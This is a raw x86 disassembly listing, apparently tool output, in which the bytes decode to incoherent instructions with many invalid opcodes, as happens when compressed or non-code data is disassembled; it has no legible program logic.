  418faa:	inc    ebp
  418fab:	(bad)  
  418fac:	push   ds
  418fad:	and    eax,0x905db63
  418fb2:	arpl   cx,sp
  418fb4:	add    ch,BYTE PTR ds:0x174fdb6d
  418fba:	les    ebx,FWORD PTR cs:[edx+0x28]
  418fbe:	add    BYTE PTR [edx-0xbd514f9],bl
  418fc4:	(bad)  
  418fc5:	jmp    0xe900:0x932e937
  418fcc:	pop    ebp
  418fcd:	sub    BYTE PTR [edi-0x6c],al
  418fd0:	inc    edx
  418fd1:	sub    BYTE PTR [edx-0x66],dh
  418fd4:	sbb    DWORD PTR [ebx],ebp
  418fd6:	pop    edi
  418fd7:	popf   
  418fd8:	dec    edi
  418fd9:	cmp    DWORD PTR [edx-0x80],esi
  418fdc:	and    BYTE PTR [esp+ebp*2],ah
  418fdf:	mov    WORD PTR [ecx],ss
  418fe1:	sub    BYTE PTR [eax],al
  418fe3:	call   0x1762:0x8b613537
  418fea:	addr16 ja 0x419018
  418fed:	sub    eax,0x91e4e63
  418ff2:	push   ecx
  418ff3:	inc    esp
  418ff4:	ins    BYTE PTR es:[edi],dx
  418ff5:	xor    DWORD PTR [edi+0x47],ebx
  418ff8:	add    BYTE PTR [eax+0x28],dl
  418ffb:	dec    esi
  418ffc:	ds popa 
  418ffe:	and    al,0x66
  419000:	add    cl,dh
  419002:	xor    al,0x72
  419004:	imul   ebx,DWORD PTR [esi+0x0],0xfbff656c
  41900b:	call   DWORD PTR [edx-0x13]
  41900e:	inc    ebp
  41900f:	jb     0x419076
  419011:	sub    ecx,ebx
  419013:	pusha  
  419014:	push   esp
  419015:	daa    
  419016:	(bad)  
  419017:	pusha  
  419018:	outs   dx,BYTE PTR ds:[esi]
  419019:	sub    bl,dl
  41901b:	fs jbe 0x41904f
  41901e:	add    DWORD PTR [ecx+0x67],esp
  419021:	sub    eax,0xa654f05
  419026:	call   0xd78efb89
  41902b:	dec    edi
  41902c:	jb     0x41905f
  41902e:	xlat   BYTE PTR ds:[ebx]
  41902f:	fs ins BYTE PTR es:[edi],dx
  419031:	ins    DWORD PTR es:[edi],dx
  419032:	call   0xfabc9097
  419037:	push   ecx
  419038:	gs or  ebp,ebx
  41903b:	push   0x72
  41903d:	in     eax,dx
  41903e:	ss jb  0x4190aa
  419041:	fdivp  st(7),st
  419043:	imul   esp,DWORD PTR [ebp-0x11],0xfffffffb
  419047:	call   DWORD PTR [edx-0x3]
  41904a:	fild   QWORD PTR [ebp+0x63]
  41904d:	retf   0x5cfb
  419050:	jae    0x418fff
  419052:	aaa    
  419053:	jno    0x4190c4
  419055:	pushf  
  419056:	out    0x4f,eax
  419058:	jb     0x41900b
  41905a:	fsub   DWORD PTR [esp+ebp*2+0x0]
  41905e:	lods   eax,DWORD PTR ds:[esi]
  41905f:	jmp    0xfbfc90c4
  419064:	cmp    al,0x73
  419066:	pop    ebx
  419067:	jmp    DWORD PTR [edx+0x6e]
  41906a:	test   al,0xd4
  41906c:	fs ins DWORD PTR es:[edi],dx
  41906e:	mov    ecx,0x675474d4
  419073:	(bad)  
  419074:	pusha  
  419075:	outs   dx,BYTE PTR ds:[esi]
  419076:	clc    
  419077:	(bad)  
  419078:	fs jbe 0x4190ac
  41907b:	dec    ecx
  41907c:	sbb    BYTE PTR [ebx+0xe],ah
  41907f:	inc    ebp
  419080:	add    al,0x0
  419082:	add    ebx,edx
  419084:	push   eax
  419085:	push   esp
  419086:	push   ecx
  419087:	add    eax,0xfbf92031
  41908c:	dec    edi
  41908d:	push   eax
  41908e:	push   esi
  41908f:	mov    eax,ds:0x962c2fd3
  419094:	cmp    DWORD PTR [ebp+0x2],ebp
  419097:	hlt    
  419098:	jmp    0xf740a4bc
  41909d:	or     eax,esi
  41909f:	push   cs
  4190a0:	and    DWORD PTR [ebx-0x1f],esp
  4190a3:	fwait
  4190a4:	out    0x1f,eax
  4190a6:	or     ecx,ebx
  4190a8:	xlat   BYTE PTR ds:[ebx]
  4190a9:	or     bh,BYTE PTR [ebx]
  4190ab:	icebp  
  4190ac:	and    BYTE PTR [ecx-0x34],ah
  4190af:	lahf   
  4190b0:	sub    eax,0x22b1f42b
  4190b5:	ins    DWORD PTR es:[edi],dx
  4190b6:	int    0xb8
  4190b8:	adc    esp,DWORD PTR [ebp+0x6b]
  4190bb:	adc    BYTE PTR [ebx],bl
  4190bd:	mov    WORD PTR fs:[edx+0x2d],ds
  4190c1:	add    BYTE PTR [di-0x2a37],ah
  4190c6:	pop    ds
  4190c7:	dec    ebx
  4190c8:	pop    es
  4190c9:	xor    edi,DWORD PTR [ebx]
  4190cb:	inc    ecx
  4190cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190cd:	test   DWORD PTR [eax-0x6a],0x8f632d5a
  4190d4:	jl     0x4190ae
  4190d6:	dec    ebx
  4190d7:	mov    WORD PTR [edx-0x49a68be2],cs
  4190dd:	loope  0x419101
  4190df:	push   ebp
  4190e0:	jne    0x4190da
  4190e2:	or     DWORD PTR [edx+0x73],esi
  4190e5:	adc    ebp,DWORD PTR [esi+0x4c]
  4190e8:	(bad)  
  4190e9:	sub    eax,0xe7825e67
  4190ee:	pop    ds
  4190ef:	push   edx
  4190f0:	sbb    al,0x16
  4190f2:	jno    0x419148
  4190f4:	or     esp,esi
  4190f6:	stc    
  4190f7:	jno    0x419123
  4190f9:	dec    ebp
  4190fa:	xor    BYTE PTR [edx],dl
  4190fc:	sub    ebx,DWORD PTR [ebx-0x27]
  4190ff:	add    ah,BYTE PTR [eax]
  419101:	push   edi
  419102:	and    DWORD PTR [ebx-0x17],ebx
  419105:	inc    edi
  419106:	xor    al,0x21
  419108:	sub    eax,0x14ee2350
  41910d:	inc    eax
  41910e:	pop    ss
  41910f:	pop    ss
  419110:	jmp    0xd91b:0x2405233d
  419117:	add    DWORD PTR ds:0x2c0e2119,edx
  41911d:	in     al,0xf9
  41911f:	icebp  
  419120:	sub    ebp,edi
  419122:	das    
  419123:	shr    BYTE PTR [edx],cl
  419125:	sti    
  419126:	fadd   DWORD PTR [eax]
  419128:	repz sub cl,BYTE PTR [edx]
  41912b:	pop    ss
  41912c:	aad    0x2f
  41912e:	add    eax,0x8e90b1f
  419133:	sbb    eax,0x2cd927cf
  419138:	sub    cl,BYTE PTR [edi]
  41913a:	mov    ah,0x32
  41913c:	xchg   edx,eax
  41913d:	sbb    eax,DWORD PTR [eax*2+0x2fbd2e8c]
  419144:	pop    ebx
  419145:	jmp    0x22dca7fd
  41914a:	retf   
  41914b:	pop    ss
  41914c:	outs   dx,BYTE PTR ds:[esi]
  41914d:	call   0xe998674c
  419152:	(bad)  
  419153:	and    cl,BYTE PTR [esi+eiz*1+0x227d2497]
  41915a:	mov    DWORD PTR [edi],edx
  41915c:	push   edx
  41915d:	aam    0xc6
  41915f:	cmp    BYTE PTR [eax+0x23e3a442],al
  419165:	out    0xb6,eax
  419167:	jmp    0x2855:0x15904036
  41916e:	add    BYTE PTR [esi+0x3],bh
  419171:	jmp    0x41f42ac
  419176:	or     dh,ah
  419178:	mov    eax,0x474e4298
  41917d:	sbb    eax,0xe4614763
  419182:	dec    ebx
  419183:	inc    esp
  419184:	inc    edi
  419185:	cs je  0x4191d9
  419188:	mov    ebx,DWORD PTR [eax+0x50004e49]
  41918e:	cmp    BYTE PTR [eax+eax*2+0x1c],dh
  419192:	daa    
  419193:	cmp    ch,cl
  419195:	cmp    eax,0x57c9544c
  41919a:	sbb    DWORD PTR [eax],esp
  41919c:	xor    DWORD PTR [ecx],eax
  41919e:	cmp    eax,0xe663c650
  4191a3:	das    
  4191a4:	fcomp  QWORD PTR [eax+0x50]
  4191a7:	ins    DWORD PTR es:[edi],dx
  4191a8:	cli    
  4191a9:	push   es
  4191aa:	rcr    DWORD PTR [edi],cl
  4191ac:	les    eax,FWORD PTR [ecx]
  4191ae:	add    al,0xa
  4191b0:	sub    BYTE PTR [eax],dl
  4191b2:	sub    ah,BYTE PTR [ebx-0x7]
  4191b5:	push   cs
  4191b6:	rcr    DWORD PTR [edi],cl
  4191b8:	adc    ebx,DWORD PTR [edx+eiz*8+0xa]
  4191bc:	repz jae 0x4191e9
  4191bf:	popa   
  4191c0:	int3   
  4191c1:	bound  ebx,QWORD PTR ds:0x2a44a42b
  4191c7:	ins    DWORD PTR es:[edi],dx
  4191c8:	int    0x3b
  4191ca:	daa    
  4191cb:	add    edx,DWORD PTR gs:0x1ccc642f
  4191d2:	sbb    eax,0xe54bb567
  4191d7:	pop    ds
  4191d8:	ror    DWORD PTR [ecx],cl
  4191da:	daa    
  4191db:	cmp    ebx,ecx
  4191dd:	out    0x1,eax
  4191df:	inc    ecx
  4191e0:	xchg   BYTE PTR [edi+eiz*1],bh
  4191e3:	arpl   WORD PTR [edx+0x6d300e],cx
  4191e9:	mov    esi,0xbc631da1
  4191ee:	cld    
  4191ef:	outs   dx,BYTE PTR ds:[esi]
  4191f0:	gs add ch,cl
  4191f3:	xchg   ecx,eax
  4191f4:	push   edx
  4191f5:	jae    0x4191ac
  4191f7:	fldcw  WORD PTR [eax]
  4191f9:	inc    ecx
  4191fa:	addr16 clc 
  4191fc:	ins    DWORD PTR es:[edi],dx
  4191fd:	je     0x419251
  4191ff:	lods   eax,DWORD PTR ds:[esi]
  419200:	dec    edx
  419201:	outs   dx,DWORD PTR ds:[esi]
  419202:	add    dh,ah
  419204:	imul   ebp,DWORD PTR [ecx+ebp*8-0x43],0x31
  419209:	cs cwde 
  41920b:	stos   DWORD PTR es:[edi],eax
  41920c:	and    eax,0x6fffff63
  419211:	popa   
  419212:	inc    esp
  419213:	hlt    
  419214:	popa   
  419215:	ins    BYTE PTR es:[edi],dx
  419216:	cmc    
  419217:	mov    eax,ds:0xd43b4d1d
  41921c:	inc    eax
  41921d:	and    BYTE PTR [ebp+0x783b2dbd],al
  419223:	inc    esp
  419224:	outs   dx,BYTE PTR gs:[esi]
  419226:	xor    al,0xfe
  419228:	jb     0x41929d
  41922a:	push   0x5d2935a2
  41922f:	xchg   ecx,eax
  419230:	or     cl,BYTE PTR [edx]
  419232:	pop    eax
  419233:	mov    ebp,0xb7e2dfd
  419238:	pop    esp
  419239:	sub    bl,BYTE PTR [esi]
  41923b:	mov    bl,0xfd
  41923d:	sub    DWORD PTR [esi],edi
  41923f:	mov    bl,0xfd
  419241:	inc    edi
  419242:	out    0xd3,eax
  419244:	inc    ebx
  419245:	add    BYTE PTR [ebx],al
  419247:	mov    eax,0xbfd0382d
  41924c:	and    dh,BYTE PTR [eax]
  41924e:	add    al,0x43
  419250:	sub    DWORD PTR ds:0x2d55a708,esp
  419256:	add    BYTE PTR ds:0xe5582f9d,dh
  41925c:	call   0x322d:0xb7fd582f
  419263:	xor    DWORD PTR [eax-0x22],ebx
  419266:	das    
  419267:	and    ebx,DWORD PTR [eax-0x22]
  41926a:	das    
  41926b:	and    ebp,DWORD PTR [eax-0x22]
  41926e:	das    
  41926f:	add    ebp,DWORD PTR [eax-0x22]
  419272:	das    
  419273:	add    edi,DWORD PTR [eax-0x22]
  419276:	das    
  419277:	add    edi,DWORD PTR [eax+0x26]
  41927a:	add    BYTE PTR [esi+0x45],ch
  41927d:	sbb    BYTE PTR [esi+0x10],cl
  419280:	cmp    al,0x2b
  419282:	jbe    0x419290
  419284:	rcr    DWORD PTR [edx],cl
  419286:	jno    0x4192ad
  419288:	dec    ebp
  419289:	das    
  41928a:	inc    edi
  41928b:	pop    es
  41928c:	inc    esi
  41928d:	xor    DWORD PTR [eax],eax
  41928f:	sbb    cl,BYTE PTR [ebp+0x16]
  419292:	outs   dx,BYTE PTR ds:[esi]
  419293:	or     al,0x4c
  419295:	aad    0x31
  419297:	dec    edi
  419298:	dec    esp
  419299:	xor    BYTE PTR [ecx+esi*1-0x27],ch
  41929d:	adc    al,0x55
  41929f:	fdivp  st(6),st
  4192a1:	fnstenv [ebx]
  4192a3:	add    edx,esi
  4192a5:	xor    BYTE PTR [ecx-0x2c],ah
  4192a8:	repnz adc al,0x0
  4192ab:	add    bh,bh
  4192ad:	sub    DWORD PTR [esi+eax*8+0x0],esi
  4192b1:	push   ss
  4192b2:	arpl   bp,sp
  4192b4:	in     eax,0x22
  4192b6:	jb     0x419295
  4192b8:	out    dx,eax
  4192b9:	das    
  4192ba:	jae    0x4192bc
  4192bc:	into   
  4192bd:	mov    eax,0x6e8d712f
  4192c2:	xor    eax,0x32688550
  4192c7:	jno    0x41926e
  4192c9:	mov    bl,0x1
  4192cb:	push   ecx
  4192cc:	xchg   dh,al
  4192ce:	adc    eax,0x28529075
  4192d3:	pop    esp
  4192d4:	outs   dx,DWORD PTR ds:[esi]
  4192d5:	rcl    DWORD PTR [ebx],0x32
  4192d8:	pop    ebp
  4192d9:	jo     0x419308
  4192db:	jae    0x41926b
  4192dd:	or     DWORD PTR [eax-0x5aca9fcf],edx
  4192e3:	aaa    
  4192e4:	xor    DWORD PTR ds:0x1d60329f,0x2680039a
  4192ee:	lea    edx,[edi]
  4192f0:	inc    esp
  4192f1:	sub    BYTE PTR [ecx+0x28],bh
  4192f4:	gs dec edi
  4192f6:	mov    BYTE PTR ds:0x31884411,dl
  4192fc:	push   esi
  4192fd:	cs dec esp
  4192ff:	push   ss
  419300:	or     eax,0xc194b39
  419305:	and    BYTE PTR [ebp+0x17],al
  419308:	std    
  419309:	dec    esi
  41930a:	xor    esi,DWORD PTR [esi*8+0x5175640]
  419311:	sbb    ah,bh
  419313:	ss adc al,0x2f
  419316:	cmp    ebx,DWORD PTR [ebx]
  419318:	ficomp WORD PTR [edx]
  41931a:	inc    esp
  41931b:	inc    eax
  41931c:	out    dx,eax
  41931d:	daa    
  41931e:	sbb    DWORD PTR [eax+0x0],eax
  419321:	add    BYTE PTR [eax],ch
  419323:	adc    eax,0x4ccd29
  419328:	and    eax,0x4c0625cd
  41932d:	into   
  41932e:	sbb    ebx,edi
  419330:	xor    al,bl
  419332:	bndstx [edx-0x23],bnd1
  419336:	cmp    BYTE PTR [edi],bl
  419338:	xor    eax,eax
  41933a:	sbb    al,0xe7
  41933c:	les    ebp,FWORD PTR ss:[esi]
  41933f:	fistp  DWORD PTR [edx]
  419341:	mov    ss,WORD PTR [edi]
  419343:	les    edi,FWORD PTR [edi]
  419345:	outs   dx,DWORD PTR ds:[esi]
  419346:	sub    bl,cl
  419348:	aad    0x7a
  41934a:	cmp    al,cl
  41934c:	sbb    DWORD PTR [edx+0x6e2cab2d],edx
  419352:	and    eax,0x22792ace
  419357:	add    BYTE PTR [edx-0x4f8dd9da],bh
  41935d:	ss dec ebx
  41935f:	push   esp
  419360:	mov    ecx,0x9571267a
  419365:	xor    bh,BYTE PTR [edx]
  419367:	ins    DWORD PTR es:[edi],dx
  419368:	pop    DWORD PTR [esi+0x1e]
  41936b:	pop    edi
  41936c:	fwait
  41936d:	or     DWORD PTR ds:0xe9248846,esi
  419373:	dec    edx
  419374:	mov    BYTE PTR [eax],al
  419376:	xor    al,0x65
  419378:	mov    WORD PTR [esi*1+0x28188851],fs
  41937f:	fs sub eax,0x4e6c345a
  419385:	add    BYTE PTR [eax+0x41],bl
  419388:	addr16 pop edx
  41938a:	cmp    DWORD PTR [esi],esp
  41938c:	jb     0x4193de
  41938e:	icebp  
  41938f:	dec    edx
  419390:	push   esp
  419391:	sbb    ebp,edi
  419393:	and    eax,0x392d3571
  419398:	pop    edi
  419399:	cmp    ah,BYTE PTR [esi+ebx*1]
  41939c:	ins    DWORD PTR es:[edi],dx
  41939d:	cmp    ecx,DWORD PTR [ecx+0x9]
  4193a0:	dec    eax
  4193a1:	push   ss
  4193a2:	inc    esp
  4193a3:	sbb    eax,0x2816084e
  4193a8:	add    BYTE PTR [esp+eax*2],bh
  4193ab:	sub    BYTE PTR [edx-0x17],dh
  4193ae:	out    0x2b,al
  4193b0:	outs   dx,BYTE PTR ds:[esi]
  4193b1:	or     al,0x35
  4193b3:	push   ds
  4193b4:	popa   
  4193b5:	add    eax,esi
  4193b7:	sub    dh,BYTE PTR [ecx+edi*8+0x40]
  4193bb:	sub    ebp,DWORD PTR [esi+0x0]
  4193be:	sub    eax,0x7bb14535
  4193c3:	cmp    cl,BYTE PTR [esp+eiz*4+0x5c]
  4193c7:	or     DWORD PTR [edi-0x39],eax
  4193ca:	inc    ebp
  4193cb:	sbb    eax,0x4d46bd5f
  4193d0:	addr16 add dl,cl
  4193d3:	pop    es
  4193d4:	inc    esi
  4193d5:	je     0x41939f
  4193d7:	outs   dx,BYTE PTR ds:[esi]
  4193d9:	imul   edx,esi,0x86568e6
  4193df:	(bad)  [edx+0x66]
  4193e2:	int3   
  4193e3:	lock pop esp
  4193e5:	jb     0x419394
  4193e7:	rol    DWORD PTR [edx+0x68],cl
  4193ea:	add    BYTE PTR [ecx-0x459a9404],dh
  4193f0:	rcl    DWORD PTR [edx+0x69],cl
  4193f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193f4:	jmp    0x419460
  4193f6:	ja     0x419443
  4193f8:	test   al,0x40
  4193fa:	outs   dx,DWORD PTR ds:[esi]
  4193fb:	mov    ch,0xe2
  4193fd:	pop    esp
  4193fe:	outs   dx,BYTE PTR ds:[esi]
  4193ff:	lods   al,BYTE PTR ds:[esi]
  419400:	jmp    0x7465:0xda6b0071
  419407:	jmp    edi
  419409:	jno    0x419470
  41940b:	fs inc edx
  41940d:	push   0x60d8fb69
  419412:	jb     0x419468
  419414:	shr    DWORD PTR [edx+0x74],1
  419417:	stc    
  419418:	fcomp  DWORD PTR [edi]
  41941a:	inc    ebx
  41941b:	mul    ebx
  41941d:	push   0x60e13661
  419422:	jb     0x41947c
  419424:	rol    DWORD PTR [eax+esi*2+0x4b],cl
  419428:	bnd fs je 0x419457
  41942c:	in     eax,0xff
  41942e:	push   edx
  41942f:	xor    ecx,esi
  419431:	pusha  
  419432:	jae    0x419448
  419434:	or     eax,0xfc48495c
  419439:	jb     0x4194a4
  41943b:	cmp    al,0xec
  41943d:	addr16 pop esp
  41943f:	pop    ds
  419440:	ficomp WORD PTR [edx+0x46]
  419443:	in     al,dx
  419444:	(bad)  
  419445:	call   FWORD PTR [ebx-0x1]
  419448:	fild   QWORD PTR [ebp+0x2e]
  41944b:	xor    ecx,ecx
  41944d:	das    
  41944e:	add    BYTE PTR [bx+di],dh
  419451:	xchg   edx,eax
  419452:	sub    ch,BYTE PTR [esi-0x68]
  419455:	mov    al,ds:0x6a665138
  41945a:	xor    eax,0x4a643150
  41945f:	push   edx
  419460:	xor    DWORD PTR [esi+eax*2+0x46],ebp
  419464:	jne    0x4194bf
  419466:	xor    eax,DWORD PTR [eax]
  419468:	jb     0x4194c7
  41946a:	xor    eax,0x31547743
  41946f:	add    BYTE PTR [eax+0x4267495f],al
  419475:	adc    al,0x30
  419477:	jb     0x4194c1
  419479:	mov    al,ds:0x14576d34
  41947e:	sbb    BYTE PTR [edi+0x43],bl
  419481:	lea    edi,ds:0x223b1d45
  419487:	pop    edi
  419488:	adc    eax,0x13f40cf
  41948d:	in     eax,0x3f
  41948f:	inc    ecx
  419490:	sbb    al,0x3c
  419492:	daa    
  419493:	inc    esi
  419494:	in     eax,0xef
  419496:	jecxz  0x4194cd
  419498:	push   ecx
  419499:	fsubr  DWORD PTR [ebx+ebp*2]
  41949c:	adc    al,0xfc
  41949e:	xor    al,BYTE PTR [ecx-0x23]
  4194a1:	shr    BYTE PTR [esp+ebp*2],cl
  4194a4:	rol    DWORD PTR [eax],cl
  4194a6:	adc    al,BYTE PTR [eax]
  4194a8:	add    al,BYTE PTR [ebx]
  4194aa:	es je  0x419493
  4194ad:	add    BYTE PTR [edx],dl
  4194af:	arpl   bp,si
  4194b1:	jmp    0x3000:0xd3006d2f
  4194b8:	push   ecx
  4194b9:	repnz loopne 0x4194ef
  4194bc:	inc    ebx
  4194bd:	fstp   st(6)
  4194bf:	push   ss
  4194c0:	je     0x41948e
  4194c2:	jmp    0x992e4fe
  4194c7:	sbb    eax,0xce1776e4
  4194cc:	and    eax,0x2cda1692
  4194d1:	test   BYTE PTR [ebx],ah
  4194d3:	enter  0x6d2f,0x38
  4194d7:	stos   BYTE PTR es:[edi],al
  4194d8:	aaa    
  4194d9:	xchg   esp,eax
  4194da:	and    cl,bl
  4194dc:	and    DWORD PTR [esi+0x17],ebx
  4194df:	out    0x32,eax
  4194e1:	test   BYTE PTR [ebx],ch
  4194e3:	mov    bl,0x16
  4194e5:	mov    ss,WORD PTR [edi]
  4194e7:	mov    WORD PTR [edi],?
  4194e9:	ins    BYTE PTR es:[edi],dx
  4194ea:	and    eax,0x257e218e
  4194ef:	mov    edx,0xa4391642
  4194f4:	aas    
  4194f5:	jo     0x419513
  4194f7:	jnp    0x419521
  4194f9:	outs   dx,DWORD PTR ds:[esi]
  4194fa:	cmp    eax,0xe905e397
  4194ff:	sahf   
  419500:	cs dec edx
  419502:	sub    al,0x8b
  419504:	xor    al,0xf0
  419506:	cmp    al,0x56
  419508:	das    
  419509:	adc    eax,0x31124827
  41950e:	ss inc esi
  419510:	es sbb eax,0x1212481a
  419516:	xor    eax,0x1400302e
  41951b:	daa    
  41951c:	dec    eax
  41951d:	xor    al,ah
  41951f:	inc    ebp
  419520:	sub    BYTE PTR [edx+esi*8],dh
  419523:	xor    al,0x2a
  419525:	sbb    ebp,esp
  419527:	sub    ebp,DWORD PTR ds:0xd5e90138
  41952d:	jecxz  0x41951d
  41952f:	push   ss
  419530:	push   es
  419531:	rcl    BYTE PTR es:0x22dc2d1a,cl
  419538:	or     BYTE PTR [eax],dh
  41953a:	in     eax,0x37
  41953c:	sub    bh,BYTE PTR [eax]
  41953e:	int3   
  41953f:	and    DWORD PTR [eax],eax
  419541:	add    eax,0xe9723213
  419546:	arpl   WORD PTR [esi],bx
  419548:	data16 fnstsw WORD PTR [edi]
  41954b:	xor    BYTE PTR [edx-0x3c],dh
  41954e:	pop    esi
  41954f:	inc    esi
  419550:	ins    BYTE PTR es:[edi],dx
  419551:	(bad)  
  419552:	push   eax
  419553:	xor    BYTE PTR [edx+edi*4+0x73],ch
  419557:	ror    BYTE PTR [edi-0x54],1
  41955a:	inc    esi
  41955b:	dec    edx
  41955c:	jae    0x419513
  41955e:	dec    ecx
  41955f:	inc    edi
  419560:	push   esp
  419561:	cdq    
  419562:	adc    bl,cl
  419564:	pop    ds
  419565:	mov    eax,ds:0xc563241f
  41956a:	sbb    eax,0xf8e544a
  41956f:	sbb    eax,0x9408862
  419574:	push   ecx
  419575:	jle    0x41958b
  419577:	adc    eax,0x2c208875
  41957c:	pop    esp
  41957d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41957e:	add    BYTE PTR [esi],cl
  419580:	push   ds
  419581:	bound  ecx,QWORD PTR [eax-0x57bec5fa]
  419587:	bound  ecx,QWORD PTR [esp+ebx*2+0x2a]
  41958b:	ds adc eax,0x39592763
  419591:	and    BYTE PTR [ecx],dl
  419593:	lea    eax,[eax+0x72]
  419596:	ds push edi
  419598:	sub    al,0x71
  41959a:	cmp    bl,BYTE PTR [edx+0x1e]
  41959d:	outs   dx,BYTE PTR ds:[esi]
  41959e:	dec    eax
  41959f:	inc    ecx
  4195a0:	sub    eax,0x1e392a4f
  4195a5:	ins    DWORD PTR es:[edi],dx
  4195a6:	cmp    eax,0xe9723013
  4195ab:	es inc esi
  4195ad:	ins    BYTE PTR es:[edi],dx
  4195ae:	push   cs
  4195af:	adc    esi,DWORD PTR [eax]
  4195b1:	ins    BYTE PTR es:[edi],dx
  4195b2:	cmp    dh,al
  4195b4:	iret   
  4195b5:	dec    edi
  4195b6:	and    al,0xf1
  4195b8:	dec    ecx
  4195b9:	jae    0x4195bb
  4195bb:	inc    esp
  4195bc:	out    0x45,eax
  4195be:	push   esp
  4195bf:	sbb    BYTE PTR ds:0xde2c475c,al
  4195c5:	popa   
  4195c6:	popa   
  4195c7:	sub    al,0xd9
  4195c9:	ds inc ecx
  4195cb:	call   0x584f216
  4195d0:	clc    
  4195d1:	pusha  
  4195d2:	inc    esi
  4195d3:	aam    0xdb
  4195d5:	pop    ds
  4195d6:	push   eax
  4195d7:	jmp    0x6adf:0xd75bffdc
  4195de:	(bad)  
  4195df:	jmp    0x84e4c3
  4195e4:	leave  
  4195e5:	fild   DWORD PTR [eax+0x5c]
  4195e8:	fwait
  4195e9:	div    BYTE PTR [ebx+0x65]
  4195ec:	xchg   esi,eax
  4195ed:	xlat   BYTE PTR ds:[ebx]
  4195ee:	dec    edi
  4195ef:	and    BYTE PTR [edx+eiz*8-0x30379a8d],cl
  4195f6:	ds jne 0x41959d
  4195f9:	out    0x45,al
  4195fb:	push   esp
  4195fc:	test   al,0xb
  4195fe:	pop    esp
  4195ff:	jae    0x4195ae
  419601:	popf   
  419602:	popa   
  419603:	popa   
  419604:	xor    al,0xc
  419606:	dec    edi
  419607:	outs   dx,DWORD PTR ds:[esi]
  419608:	mov    dh,0xf7
  41960a:	jb     0x41966d
  41960c:	or     ch,al
  41960e:	pop    ebx
  41960f:	inc    esi
  419610:	in     al,dx
  419611:	jmp    0x419681
  419613:	push   0x5c4fcd46
  419618:	sub    eax,DWORD PTR ds:0xf0f66f4f
  41961e:	jb     0x419681
  419620:	cmp    ch,al
  419622:	pop    ebx
  419623:	inc    esi
  419624:	in     al,dx
  419625:	jmp    0x419695
  419627:	push   0x4fcd16
  41962c:	sub    ebx,esi
  41962e:	gs je  0x419678
  419631:	in     al,dx
  419632:	jno    0x419699
  419634:	xor    esi,edx
  419636:	inc    ebp
  419637:	ins    BYTE PTR es:[edi],dx
  419638:	shl    dl,1
  41963a:	sub    eax,DWORD PTR [esi-0x17]
  41963d:	icebp  
  41963e:	aas    
  41963f:	xor    al,0x31
  419641:	fldcw  WORD PTR ds:0x3000bd71
  419647:	ins    BYTE PTR es:[edi],dx
  419648:	add    BYTE PTR [edx+edx*4-0x4762a0bb],dl
  41964f:	xor    DWORD PTR [edi-0x5b],ebx
  419652:	mov    eax,0xac907001
  419657:	sub    DWORD PTR [eax],eax
  419659:	js     0x4196a9
  41965b:	adc    BYTE PTR [eax+edx*4-0x4c],dh
  41965f:	sub    eax,0x15c16120
  419664:	push   0x74225c31
  419669:	push   eax
  41966a:	data16 sub al,0x6c
  41966d:	dec    ebp
  41966e:	jge    0x41967f
  419670:	add    BYTE PTR [ebp+0x53],bh
  419673:	sub    dh,BYTE PTR [esp+ecx*2+0x73]
  419677:	jmp    0x4196dc
  419679:	push   eax
  41967a:	je     0x41967d
  41967c:	pop    esp
  41967d:	pusha  
  41967e:	or     eax,0xbe4a612a
  419683:	and    eax,0x3da03d5f
  419688:	dec    eax
  419689:	sbb    BYTE PTR [ebx],dl
  41968b:	adc    eax,0xea29236d
  419690:	arpl   WORD PTR [eax],dx
  419692:	xor    al,0x4
  419694:	pop    esp
  419695:	out    dx,eax
  419696:	inc    ebx
  419697:	and    esi,DWORD PTR [ecx+0x19]
  41969a:	out    0x3b,al
  41969c:	push   eax
  41969d:	in     eax,0x92
  41969f:	add    DWORD PTR [edi+esi*8+0x3b],ebx
  4196a3:	and    esi,DWORD PTR [ecx+0x9]
  4196a6:	fidivr WORD PTR [ebx]
  4196a8:	push   eax
  4196a9:	or     eax,0x5c0194
  4196ae:	out    dx,eax
  4196af:	or     BYTE PTR [eax],dl
  4196b1:	sub    dl,dl
  4196b3:	xor    dl,BYTE PTR [eax]
  4196b5:	sub    ch,al
  4196b7:	daa    
  4196b8:	out    0x37,eax
  4196ba:	rcr    BYTE PTR [edi],0x13
  4196bd:	and    edx,ebx
  4196bf:	daa    
  4196c0:	adc    eax,0xf923d425
  4196c5:	jmp    0x444b288
  4196ca:	lea    ebx,[ebx]
  4196cc:	add    al,0x27
  4196ce:	xchg   edx,eax
  4196cf:	pop    ds
  4196d0:	fist   DWORD PTR [esi]
  4196d2:	xchg   edx,eax
  4196d3:	sbb    edx,ebp
  4196d5:	and    BYTE PTR [ebx-0x65e3fae6],ah
  4196db:	sbb    eax,0x208f37e7
  4196e0:	shl    DWORD PTR [eax],cl
  4196e2:	jnp    0x419704
  4196e4:	retf   
  4196e5:	daa    
  4196e6:	push   esi
  4196e7:	fild   QWORD PTR [esi-0x65f6a2d8]
  4196ed:	sub    cl,BYTE PTR [edi+0x15]
  4196f0:	sahf   
  4196f1:	and    al,0x63
  4196f3:	and    al,0xbb
  4196f5:	inc    ecx
  4196f6:	dec    esi
  4196f7:	sbb    eax,0x1d563d8c
  4196fc:	jnp    0x419722
  4196fe:	xor    DWORD PTR [edx],edi
  419700:	xchg   esi,eax
  419701:	and    DWORD PTR [ebp+0x16],eax
  419704:	mov    BYTE PTR ds:0x2cad2d52,dl
  41970a:	sbb    eax,0x152c9124
  41970f:	sbb    eax,0xf100e448
  419714:	sbb    al,0x50
  419716:	and    DWORD PTR [edi],eax
  419718:	adc    eax,0x1a1f4ce7
  41971d:	push   ebx
  41971e:	and    eax,0x40261d15
  419723:	push   ss
  419724:	sbb    esp,edi
  419726:	dec    ebx
  419727:	add    al,0x1a
  419729:	add    BYTE PTR ds:0x44713a35,bh
  41972f:	aas    
  419730:	or     DWORD PTR [eax+0x8],edx
  419733:	inc    esi
  419734:	sbb    BYTE PTR [eax],al
  419736:	cmp    DWORD PTR [edx],ecx
  419738:	sbb    esi,DWORD PTR [ecx+ebp*8+0x4]
  41973c:	sub    ch,BYTE PTR [ebx-0x2]
  41973f:	sub    ah,BYTE PTR ss:[eax]
  419742:	sub    eax,0x1a001b0c
  419747:	adc    BYTE PTR [ebx],bl
  419749:	jbe    0x419757
  41974b:	inc    edi
  41974c:	jmp    0x288487a4
  419751:	add    BYTE PTR [edx-0x3b89e8af],bh
  419757:	cmp    al,0xdb
  419759:	inc    edi
  41975a:	(bad)  
  41975b:	daa    
